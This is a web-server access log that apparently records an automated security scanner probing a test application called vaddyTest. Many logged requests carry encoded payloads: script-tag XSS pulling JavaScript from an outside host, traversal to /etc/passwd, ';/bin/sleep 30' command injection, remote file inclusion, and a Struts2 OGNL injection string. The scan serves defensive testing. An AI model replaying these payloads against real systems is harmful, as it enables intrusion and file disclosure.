52.69.45.235 - - [20/Dec/2019:08:01:21 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:21 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:21 +0000] "GET /vaddyTest%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E/login HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:01:21 +0000] "GET /vaddyTest/login%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:21 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:22 +0000] "GET /vaddyTest%27/login HTTP/1.1" 404 1012
203.141.138.55 - - [20/Dec/2019:08:01:22 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:22 +0000] "GET /vaddyTest/login%27 HTTP/1.1" 404 974
203.141.138.55 - - [20/Dec/2019:08:01:22 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:22 +0000] "GET /vaddyTest%2F*%2F/login HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:22 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:23 +0000] "GET /vaddyTest/login%2F*%2F HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:23 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:23 +0000] "GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/login HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:23 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:23 +0000] "GET /vaddyTest/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:23 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:24 +0000] "GET /vaddyTest/login%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:24 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:24 +0000] "GET /vaddyTest/login%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:01:24 +0000] "GET /http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F/login HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:24 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:24 +0000] "GET /vaddyTest/http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:25 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:25 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:25 +0000] "GET /vaddyTest/login HTTP/1.1" 200 811
52.69.45.235 - - [20/Dec/2019:08:01:25 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:25 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:26 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:26 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:26 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:26 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:26 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:27 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:27 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:27 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:27 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:27 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:27 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:28 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:28 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:28 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:28 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
52.69.45.235 - - [20/Dec/2019:08:01:28 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:28 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:29 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:29 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:29 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:29 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:30 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:30 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:30 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:30 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:30 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:30 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:31 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:31 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:31 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:31 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:31 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:32 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:32 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:32 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:32 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
52.69.45.235 - - [20/Dec/2019:08:01:32 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:32 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:33 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:33 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:33 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:33 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:33 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:34 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:34 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:34 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:34 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:34 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:34 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:35 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:35 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:35 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:35 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:35 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:36 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:36 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:36 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:36 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:36 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:37 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:37 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:37 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:37 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:37 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:37 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:38 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:38 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:38 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:38 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:38 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:39 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:39 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:39 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:39 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:39 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:40 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:40 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:40 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:40 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:40 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:40 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:41 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:41 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:41 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:41 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:42 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:42 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:42 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:42 +0000] "POST /vaddyTest/login HTTP/1.1" 500 11891
203.141.138.55 - - [20/Dec/2019:08:01:42 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:42 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:43 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:43 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:43 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:43 +0000] "POST /vaddyTest/login HTTP/1.1" 500 11891
203.141.138.55 - - [20/Dec/2019:08:01:43 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:44 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:44 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:44 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:44 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:44 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:44 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:45 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:45 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:45 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:45 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:45 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:45 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:46 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:46 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:46 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:46 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:46 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:47 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:47 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:47 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
52.69.45.235 - - [20/Dec/2019:08:01:47 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:47 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:48 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:48 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:48 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:48 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:48 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:48 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:49 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:49 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:49 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:49 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:49 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:49 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:50 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:50 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:50 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:50 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:50 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:51 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:51 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
52.69.45.235 - - [20/Dec/2019:08:01:51 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:51 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:51 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:51 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:52 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
203.141.138.55 - - [20/Dec/2019:08:01:52 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:52 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
52.69.45.235 - - [20/Dec/2019:08:01:53 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:01:53 +0000] "GET /vaddyTest/login HTTP/1.1" 200 884
203.141.138.55 - - [20/Dec/2019:08:01:54 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:54 +0000] "POST /vaddyTest/login HTTP/1.1" 302 -
52.69.45.235 - - [20/Dec/2019:08:01:54 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
52.69.45.235 - - [20/Dec/2019:08:01:55 +0000] "GET /vaddyTest%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E/home HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:01:55 +0000] "GET /vaddyTest/home%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:01:55 +0000] "GET /vaddyTest%27/home HTTP/1.1" 404 1010
203.141.138.55 - - [20/Dec/2019:08:01:56 +0000] "POST /vaddyTest/osInjection?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.hook[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString&hook=HOOK_VAL HTTP/1.1" 500 4381
52.69.45.235 - - [20/Dec/2019:08:01:56 +0000] "GET /vaddyTest/home%27 HTTP/1.1" 404 974
203.141.138.55 - - [20/Dec/2019:08:01:56 +0000] "POST /vaddyTest/osInjection?debug=console HTTP/1.1" 500 4381
52.69.45.235 - - [20/Dec/2019:08:01:56 +0000] "GET /vaddyTest%2F*%2F/home HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:56 +0000] "POST /vaddyTest/osInjection?Class.classLoader.URLs[0]=testClassloaderManipulation1576828916 HTTP/1.1" 500 4381
52.69.45.235 - - [20/Dec/2019:08:01:56 +0000] "GET /vaddyTest/home%2F*%2F HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:57 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:57 +0000] "GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/home HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:57 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:57 +0000] "GET /vaddyTest/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:01:57 +0000] "GET /vaddyTest/home%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:57 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:58 +0000] "GET /vaddyTest/home%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:58 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:58 +0000] "GET /http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F/home HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:58 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:58 +0000] "GET /vaddyTest/http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:58 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:59 +0000] "GET /vaddyTest/home HTTP/1.1" 200 62049
203.141.138.55 - - [20/Dec/2019:08:01:59 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
203.141.138.55 - - [20/Dec/2019:08:01:59 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:01:59 +0000] "GET /vaddyTest%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E/newPost HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:01:59 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:00 +0000] "GET /vaddyTest/newPost%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2FXSSTOKEN%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:00 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:00 +0000] "GET /vaddyTest%27/newPost HTTP/1.1" 404 1016
203.141.138.55 - - [20/Dec/2019:08:02:00 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:00 +0000] "GET /vaddyTest/newPost%27 HTTP/1.1" 404 974
52.69.45.235 - - [20/Dec/2019:08:02:01 +0000] "GET /vaddyTest%2F*%2F/newPost HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:01 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:01 +0000] "GET /vaddyTest/newPost%2F*%2F HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:01 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:01 +0000] "GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/newPost HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:01 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:01 +0000] "GET /vaddyTest/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:02 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:02 +0000] "GET /vaddyTest/newPost%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:02 +0000] "POST null null" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:02 +0000] "GET /vaddyTest/newPost%3B%2Fbin%2Fsleep+30 HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:02 +0000] "POST null null" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:02 +0000] "GET /http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F/newPost HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:03 +0000] "POST null null" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:03 +0000] "GET /vaddyTest/http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:02:03 +0000] "POST null null" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:03 +0000] "GET /vaddyTest/newPost HTTP/1.1" 200 1988
203.141.138.55 - - [20/Dec/2019:08:02:03 +0000] "POST null null" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:04 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1951
203.141.138.55 - - [20/Dec/2019:08:02:04 +0000] "POST null null" 400 -
52.69.45.235 - - [20/Dec/2019:08:02:04 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1653
203.141.138.55 - - [20/Dec/2019:08:02:04 +0000] "POST /vaddyTest/osInjection HTTP/1.1" 200 1038
52.69.45.235 - - [20/Dec/2019:08:02:04 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1651
203.141.138.55 - - [20/Dec/2019:08:02:04 +0000] "POST /vaddyTest/osInjection?redirect:http://www.example.com/%23 HTTP/1.1" 500 4381
52.69.45.235 - - [20/Dec/2019:08:02:05 +0000] "POST /vaddyTest/confirmPost HTTP/1.1" 200 1804
203.141.138.55 - - [20/Dec/2019:08:02:05 +0000] "POST /vaddyTest/osInjection?redirectAction:http://www.example.com/%23 HTTP/1.1" 500 4381
